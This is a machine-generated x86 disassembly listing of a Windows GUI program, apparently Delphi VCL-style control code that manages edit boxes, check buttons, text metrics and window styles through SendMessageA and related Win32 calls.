pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call SendMessageA
sub_42cd04
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_42cd40
pop ebx
retn
sub_42cd40
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_41cd3c
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_434270
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_42ce0c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_438e08
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_42ce44
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_43b290
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_43b290
push eax
call SendMessageA
sub_42ce84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43a8a8
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_42cd04
mov eax ebx
call sub_438830
sub_42ceb8
push ebx
mov ebx eax
mov eax ebx
call sub_43a7ec
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_42cd40
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_42cf00
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43a644
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_43b290
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_42c9c4
sub_42cf3c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43b594
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_4032f4
push 0xfffffff0
mov eax esi
call sub_43b290
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_42cf74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_43c370
pop esi
pop ebx
retn
sub_42cf90
push ebx
push esi
mov ebx eax
xor esi esi
mov eax [ ebx + 0x10 ]
call sub_43b594
test al al
jne r-xdata
push 0x0
push 0x0
push 0xba
mov eax [ ebx + 0x10 ]
call sub_43b290
push eax
call SendMessageA
mov esi eax
push 0x0
push 0x0
mov eax esi
dec eax
push eax
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_43b290
push eax
call SendMessageA
push eax
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_43b290
push eax
call SendMessageA
test eax eax
jne r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
retn
dec esi
sub_42d000
push ebx
push esi
push edi
add esp 0xfffff004
push eax
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov [ eax ] 0x1000
mov eax esp
push eax
push esi
push 0xc4
mov eax [ ebx + 0x10 ]
call sub_43b290
push eax
call SendMessageA
mov ecx eax
mov edx esp
mov eax edi
call sub_403fa4
add esp 0x1000
pop edi
pop esi
pop ebx
retn
sub_42d044
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_43b290
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_43b290
push eax
call SendMessageA
add eax esi
push eax
push esi
push 0xb1
mov eax [ ebx + 0x10 ]
call sub_43b290
push eax
call SendMessageA
mov eax edi
call sub_404374
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x10 ]
call sub_43b290
push eax
call SendMessageA
sub_42d0b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42d1a3
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d1aa
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
push 0x0
push edi
push 0xbb
mov eax [ esi + 0x10 ]
call sub_43b290
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jl r-xdata
push 0x0
dec edi
push edi
push 0xbb
mov eax [ esi + 0x10 ]
call sub_43b290
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jl r-xdata
lea eax [ ebp - 0x8 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_4041c0
jmp r-xdata
push 0x0
push ebx
push 0xc1
mov eax [ esi + 0x10 ]
call sub_43b290
push eax
call SendMessageA
test eax eax
je r-xdata
push ebx
push ebx
push 0xb1
mov eax [ esi + 0x10 ]
call sub_43b290
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
call sub_404374
push eax
push 0x0
push 0xc2
mov eax [ esi + 0x10 ]
call sub_43b290
push eax
call SendMessageA
add ebx eax
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041c0
sub_42d1b7
inc [ edx ]
add [ eax ] al
add [ 0xa ] cl
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov edi edx
mov ebx eax
push 0x0
push edi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_43b290
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
inc edi
push edi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_43b290
push eax
call SendMessageA
mov edi eax
test edi edi
jge r-xdata
push edi
push esi
push 0xb1
mov eax [ ebx + 0x10 ]
call sub_43b290
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x10 ]
call sub_43b290
push eax
call SendMessageA
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_43b290
push eax
call SendMessageA
mov edi eax
add edi esi
sub_42d264
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
call sub_43b594
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_43b290
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ esi + 0x10 ]
call sub_435c5c
mov eax [ esi + 0x10 ]
call sub_434fcc
sub_42d2c8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42d391
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_407bd0
mov eax [ ebp - 0x4 ]
call sub_404174
mov esi eax
mov eax [ ebx + 0x10 ]
call sub_434a04
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push 0x0
push 0xc
mov eax [ ebx + 0x10 ]
call sub_43b290
push eax
call SendMessageA
test eax eax
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x10 ]
call sub_434a90
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4042c0
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax [ ebx + 0x10 ]
call sub_435c5c
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d398
lea eax [ ebp - 0xc ]
call sub_403eb4
lea eax [ ebp - 0x8 ]
call sub_403eb4
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_42d3a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42c6cc
mov edx 0xb9
mov eax ebx
call sub_43424c
mov edx 0x59
mov eax ebx
call sub_434270
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebx + 0x226 ] 0x1
mov [ ebx + 0x227 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov esi eax
mov [ ebx + 0x220 ] esi
mov [ esi + 0x10 ] ebx
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xbc ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_42d430
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x220 ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4370e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_42d460
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_42cb18
mov eax ebx
mov si 0xffc8
call sub_4032f4
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x224 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
xor ecx ecx
mov cl [ ebx + 0x226 ]
mov ecx [ ecx * 4 + rw-data ]
not ecx
and edx ecx
or edx 0x4
or eax edx
xor edx edx
mov dl [ ebx + 0x225 ]
or eax [ edx * 4 + rw-data ]
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_42d4c4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx r-xdata
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_4067dc
mov [ esi + 0x180 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5 ] 0x8
je r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfffff7ff
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx r-xdata
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_4067dc
mov edi eax
mov [ esi + 0x180 ] edi
test edi edi
je r-xdata
mov eax [ ebx ]
push eax
push 0x0
push 0xc
mov eax [ esi + 0x180 ]
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push edi
call SendMessageA
jmp r-xdata
sub_42d58d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
push 0x0
push 0x0
push 0xb0
mov eax ebx
call sub_43b290
push eax
call SendMessageA
shr eax 0x10
movzx eax ax
mov [ esi ] eax
push 0x0
mov eax [ esi ]
push eax
push 0xc9
mov eax ebx
call sub_43b290
push eax
call SendMessageA
mov [ esi + 0x4 ] eax
push 0x0
push 0xffffffff
push 0xbb
mov eax ebx
call sub_43b290
push eax
call SendMessageA
sub [ esi ] eax
pop esi
pop ebx
retn
sub_42d5f0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov eax [ esi + 0x4 ]
push eax
push 0xbb
mov eax ebx
call sub_43b290
push eax
call SendMessageA
add eax [ esi ]
mov esi eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_43b290
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42d698
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x228 ] 0x0
je r-xdata
and [ esi + 0xc ] 0xfffffffd
or [ esi + 0xc ] 0x2
jmp r-xdata
pop esi
pop ebx
retn
and [ esi + 0xc ] 0xfffffffb
cmp [ ebx + 0x227 ] 0x0
jne r-xdata
sub_42d6d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a274
cmp [ esi ] 0xd
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x227 ] 0x0
jne r-xdata
mov [ esi ] 0x0
sub_42d6f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_436f88
mov eax esi
mov edx [ r-xdata ]
call sub_4032a8
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_42d71c
push ebx
mov ebx eax
mov eax ebx
call sub_440dbc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_42d754
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_42d7aa
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_42d7b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_436fbc
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_42d80c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43bd60
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_42d860
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_42d884
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_438ca4
mov eax ebx
mov si 0xffb5
call sub_4032f4
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_43b290
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_4032f4
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_42d8fc
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_4279c8
mov ebx eax
mov eax ebx
call sub_427aa8
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43b290
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_427ba8
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42d948
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4279c8
call sub_427aa8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4396e4
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_42d974
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43811c
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_42d9ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42d7b8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_43424c
mov edx 0x19
mov eax esi
call sub_434270
mov dl 0x1
mov eax esi
call sub_43b4c4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_42da38
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_43b594
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_43b290
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_43b290
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_42da8c
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_43b594
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44b71c
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_435c5c
sub_42dac0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42d974
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_438048
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_42db28
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_43a70c
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44b624
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_4032f4
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4032f4
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42db95
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42dc0e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_434a90
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44b6ac
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43a714
mov eax ebx
mov si 0xffb8
call sub_4032f4
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_4032f4
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dc15
sub_42dc1c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_43a71c
pop edi
pop esi
pop ebx
retn
sub_42dc70
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4279c8
call sub_427aa8
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_42dc9c
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_4279c8
mov ebx eax
mov eax ebx
call sub_427aa8
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43b290
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_427ba8
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42dce8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42d7b8
mov edx 0x61
mov eax esi
call sub_43424c
mov edx 0x11
mov eax esi
call sub_434270
mov dl 0x1
mov eax esi
call sub_43b4c4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_42dd54
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_4032f4
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_42dd80
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_42de08
retn
mov dl 0x2
call sub_42de08
jmp r-xdata
xor edx edx
call sub_42de08
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_42de08
jmp r-xdata
sub_42de08
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_43b594
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_43b290
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_4032f4
sub_42de5c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_42d974
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_438048
mov eax ebx
mov si 0xffc8
call sub_4032f4
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_42deb7
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5c79173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_43b290
push eax
call SendMessageA
pop ebx
retn
sub_42df00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42df8e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_434a90
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44b6ac
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43a714
mov eax ebx
mov si 0xffb8
call sub_4032f4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_4032f4
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42df95
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_42dfac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42d7b8
mov edx 0x71
mov eax esi
call sub_43424c
mov edx 0x11
mov eax esi
call sub_434270
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_42e014
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_4032f4
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_42e054
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_437fc0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_437f84
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_441050
sub_42e110
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43b4c4
mov eax [ ebp - 0x4 ]
call sub_43b594
test al al
je r-xdata
